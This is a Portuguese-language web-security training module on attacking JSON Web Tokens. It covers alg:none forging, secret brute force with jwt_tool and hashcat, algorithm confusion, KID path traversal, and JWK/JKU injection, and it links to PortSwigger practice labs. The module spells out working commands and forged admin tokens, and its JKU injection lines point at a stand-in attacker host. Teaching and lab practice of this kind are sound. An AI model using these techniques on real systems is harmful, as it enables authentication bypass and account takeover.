# 🔑 11. JWT Attacks — Ataques a JSON Web Tokens

> JWT é o padrão de autenticação moderno. Mas se você pode forjar o token, você pode ser qualquer pessoa.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 60min | ⭐⭐⭐ Avançado | `jwt_tool, Burp Decoder, curl` |

</div>

---

## 🎓 Por que isso importa?

JWT (JSON Web Token) é o token de autenticação mais usado em APIs modernas. Ele consiste em três partes: **header**, **payload** e **signature**. Se a aplicação não valida corretamente a assinatura, algoritmo ou conteúdo, o atacante pode **forjar tokens** para assumir qualquer identidade.

**Analogia:** Imagine um crachá de identificação que diz "Nome: João, Cargo: Admin". Se o porteiro não verifica o carimbo de segurança (signature), qualquer pessoa pode escrever "Admin" e entrar.

**Impacto real:**
- **Bypass de autenticação** — acessar como admin
- **Privilege escalation** — assumir qualquer papel
- **Account takeover** — assumir controle de contas

**PortSwigger:** 8 labs dedicados (Apprentice → Expert)

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| HTTP basics (headers, cookies) | Sim | Módulo 00 |
| Burp Suite (Repeater, Decoder) | Sim | Arquivo 01 deste módulo |
| Base64 decoding | Sim | Burp Decoder |

---

## 🎯 Quando testar JWT

- Quando a app usa **Authorization: Bearer eyJ...**
- Quando existem **cookies JWT** (session, access_token)
- Para bypass de autenticação em APIs
- Para privilege escalation (user → admin)
- Para account takeover via token manipulation

---

## 🔄 Como funciona o JWT

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.abc123
 │                        │                  │
 ▼                        ▼                  ▼
Header                   Payload            Signature
{"alg":"HS256"}         {"user":"admin"}    HMAC-SHA256

# Decodificar (sem verificar assinatura):
Header:    {"alg":"HS256"}           → algoritmo
Payload:   {"user":"admin"}          → dados
Signature: HMAC-SHA256(base64(header) + "." + base64(payload), secret)
```

---

## 📝 Tipos de Ataques JWT

### 1. Alg: none (sem assinatura)

Se a app aceita `alg: none`, a assinatura não é verificada.

```bash
# Decodificar JWT
echo -n 'eyJ1c2VyIjoiYWRtaW4ifQ' | base64 -d
# Output: {"user":"admin"}

# Modificar header para alg: none
# Header original: {"alg":"HS256"}
# Header modificado: {"alg":"none"}

# Gerar novo JWT:
# 1. Base64 do header modificado
echo -n '{"alg":"none"}' | base64 -w0
# Output: eyJhbGciOiJub25lIn0

# 2. Base64 do payload
echo -n '{"user":"admin"}' | base64 -w0
# Output: eyJ1c2VyIjoiYWRtaW4ifQ

# 3. Concatenar (SEM assinatura):
# eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# 4. Enviar
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." http://target.com/api/admin
```

### 2. Weak Secret (brute force)

```bash
# Usar jwt_tool para brute force
python3 jwt_tool.py JWT_HERE -C -d rockyou.txt

# Ou manualmente com hashcat
hashcat -m 16500 jwt.txt rockyou.txt

# jwt_tool com wordlist
python3 jwt_tool.py eyJhbG... -C -d /usr/share/wordlists/rockyou.txt
```

### 3. Algorithm Confusion (RS256 → HS256)

```bash
# Se a app usa RS256 (assimétrica) mas aceita HS256 (simétrica):
# Usar a CHAVE PÚBLICA como secret HMAC

# 1. Baixar chave pública
curl http://target.com/.well-known/jwks.json

# 2. Converter para HMAC secret
openssl rsa -pubin -in public.pem -outform PEM > public_hmac.pem

# 3. Assinar com chave pública como secret HMAC
python3 jwt_tool.py JWT_HERE -X k -pk public_hmac.pem

# 4. Enviar token modificado
```

### 4. KID Injection (Key ID)

```bash
# Se o JWT usa campo "kid" no header:
# {"alg":"RS256","kid":"1"}

# Injetar path traversal no kid:
# {"alg":"RS256","kid":"/dev/null"}

# Ou:
# {"alg":"RS256","kid":"../../dev/null"}

# Se o servidor usa o kid para buscar chave:
# /dev/null não tem chave → retorna vazio → assinatura inválida
# Mas se a app usa vazio como chave → bypass possível
```

### 5. JWK/JKU Injection

```bash
# JWK (JSON Web Key): chave embutida no header
# JKU (JWK Set URL): URL para buscar chaves

# Se a app aceita JKU:
# 1. Hostar JKU malicioso em seu servidor
# 2. Apontar header "jku" para seu servidor
# 3. Usar chave privada para assinar

# Exemplo de JKU malicioso:
# {"keys":[{"kty":"RSA","n":"...","e":"AQAB"}]}
```

### 6. None Algorithm Bypass

```bash
# Ferramenta automática
python3 jwt_tool.py eyJhbG... -X n

# Ou manual:
# 1. Decodificar header: {"alg":"HS256"}
# 2. Trocar para: {"alg":"none"}
# 3. Remover assinatura (último ponto)
# 4. Enviar: header.payload.
```

---

## 🛠️ Ferramenta: jwt_tool

```bash
# Instalar
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip install -r requirements.txt

# Listar opções
python3 jwt_tool.py

# Decodificar JWT
python3 jwt_tool.py eyJhbG... 

# Verificar se é vulnerável a none
python3 jwt_tool.py eyJhbG... -X n

# Brute force de secret
python3 jwt_tool.py eyJhbG... -C -d rockyou.txt

# Injetar JWU
python3 jwt_tool.py eyJhbG... -X u -ju http://attacker.com/jwks.json

# Injetar JWK
python3 jwt_tool.py eyJhbG... -X j

# Usar chave pública para confusion
python3 jwt_tool.py eyJhbG... -X k -pk public.pem

# Modificar payload
python3 jwt_tool.py eyJhbG... -S hs256 -p 'secret'
```

---

## 📝 Exemplos Práticos

### Exemplo 1: JWT Decode no Burp

```bash
# 1. Interceptar request com Authorization: Bearer eyJ...
# 2. Copiar o JWT
# 3. Burp Decoder → colar → Decode as Base64

# Header (primeira parte):
eyJhbGciOiJIUzI1NiJ9
→ Decode → {"alg":"HS256"}

# Payload (segunda parte):
eyJ1c2VyIjoiYWRtaW4ifQ
→ Decode → {"user":"admin"}

# 4. Identificar se aceita alg:none
# 5. Modificar e reenviar
```

### Exemplo 2: None Algorithm Bypass

```bash
# 1. Decodificar header
echo -n 'eyJhbGciOiJIUzI1NiJ9' | base64 -d
# {"alg":"HS256"}

# 2. Criar header none
echo -n '{"alg":"none"}' | base64 -w0
# eyJhbGciOiJub25lIn0

# 3. Manter payload original
# eyJ1c2VyIjoiYWRtaW4ifQ

# 4. Concatenar com PONTO no final
# eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# 5. Enviar
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." \
  http://target.com/api/admin
```

### Exemplo 3: Brute Force Secret

```bash
# jwt_tool automatizado
python3 jwt_tool.py eyJhbGci... -C -d /usr/share/wordlists/rockyou.txt

# Output se encontrar:
# [+] SECRET FOUND: secret123

# Usar secret para assinar
python3 jwt_tool.py eyJhbGci... -S hs256 -p 'secret123'
```

### Exemplo 4: Modificar Payload via Repeater

```bash
# 1. Interceptar request com JWT
# 2. Enviar para Repeater (Ctrl+R)
# 3. Decodificar payload:
#    {"user":"regular_user"}

# 4. Modificar para:
#    {"user":"admin"}

# 5. Re-encodificar e enviar
# 6. Se servidor aceita → privilege escalation
```

### Exemplo 5: Algorithm Confusion

```bash
# 1. Baixar chave pública JWKS
curl http://target.com/.well-known/jwks.json

# 2. Converter para PEM
# Usar jq para extrair n e e
# Gerar chave pública

# 3. Assinar com chave pública como secret HMAC
python3 jwt_tool.py eyJhbG... -X k -pk public.pem

# 4. Enviar token
curl -H "Authorization: Bearer TOKEN_MODIFICADO" http://target.com/api
```

---

## 🔄 Fluxo de Teste JWT

```
┌─────────────────────────────────────────────────────────┐
│  1. CAPTURAR JWT                                        │
│     - Interceptar request com Bearer token              │
│     - Decodificar header e payload                      │
│     - Identificar algoritmo (alg field)                 │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  2. TESTAR ALG:NONE                                     │
│     - Modificar header para {"alg":"none"}              │
│     - Remover assinatura                                │
│     - Se aceita → vulnerabilidade crítica               │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  3. TESTAR WEAK SECRET                                  │
│     - Brute force com rockyou.txt                       │
│     - hashcat -m 16500                                  │
│     - Se encontrar → assinar novos tokens               │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  4. TESTAR ALGORITHM CONFUSION                          │
│     - RS256 → HS256 com chave pública                   │
│     - JKU/JWK injection                                 │
│     - KID path traversal                                │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  5. ESCALAR                                              │
│     - Modificar payload (user → admin)                  │
│     - Forjar tokens completos                           │
│     - Account takeover                                  │
└─────────────────────────────────────────────────────────┘
```

---

## ❌ Erros Comuns

| Erro | Solução |
|------|---------|
| "Token não é JWT" | Verificar se é Bearer token opaco (não JWT) |
| "alg:none não funciona" | App pode validar assinatura mesmo com none → testar outras |
| "Brute force não acha" | Secret pode ser forte → tentar algorithm confusion |
| "Modifiquei payload mas não funciona" | Assinatura quebrou → precisa re-assinar com secret correto |
| "KID injection não funciona" | App pode não usar KID para buscar chave |

---

## 📋 Cheat Sheet Rápido

### Decodificar JWT (Base64)

```bash
echo -n 'eyJhbGciOiJIUzI1NiJ9' | base64 -d
echo -n 'eyJ1c2VyIjoiYWRtaW4ifQ' | base64 -d

# jwt_tool decodifica automaticamente
python3 jwt_tool.py eyJhbG...
```

### jwt_tool Comandos Essenciais

```bash
# Decodificar
python3 jwt_tool.py TOKEN

# None bypass
python3 jwt_tool.py TOKEN -X n

# Brute force
python3 jwt_tool.py TOKEN -C -d rockyou.txt

# JKU injection
python3 jwt_tool.py TOKEN -X u -ju http://attacker.com/jwks.json

# Re-sign
python3 jwt_tool.py TOKEN -S hs256 -p 'secret'
```

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | Tópicos | Tempo |
|---|:----------:|:----|:--------|:-----:|
| 1 | PortSwigger | [JWT authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification) | None bypass | 10min |
| 2 | PortSwigger | [JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key) | Brute force | 15min |
| 3 | PortSwigger | [JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection) | JWK injection | 20min |
| 4 | PortSwigger | [JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection) | JKU injection | 20min |
| 5 | PortSwigger | [JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal) | KID injection | 20min |
| 6 | PortSwigger | [JWT authentication bypass via algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion) | RS256→HS256 | 30min |

---

## 📚 Referências

- [PortSwigger — JWT Attacks](https://portswigger.net/web-security/jwt)
- [PortSwigger — JWT Labs](https://portswigger.net/web-security/jwt)
- [jwt_tool — JWT exploitation](https://github.com/ticarpi/jwt_tool)
- [HackTricks — JWT](https://book.hacktricks.xyz/pentesting-web/json-web-tokens)
- [OWASP — JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Decodificar JWT (header, payload, signature)
- [ ] Identificar algoritmo de assinatura (alg field)
- [ ] Executar bypass via alg:none
- [ ] Brute force de weak secrets com jwt_tool e hashcat
- [ ] Executar algorithm confusion (RS256→HS256)
- [ ] Explorar KID injection (path traversal)
- [ ] Explorar JWK/JKU injection
- [ ] Modificar payloads para privilege escalation
- [ ] Usar jwt_tool para automatizar ataques
- [ ] Completar todos os labs PortSwigger de JWT
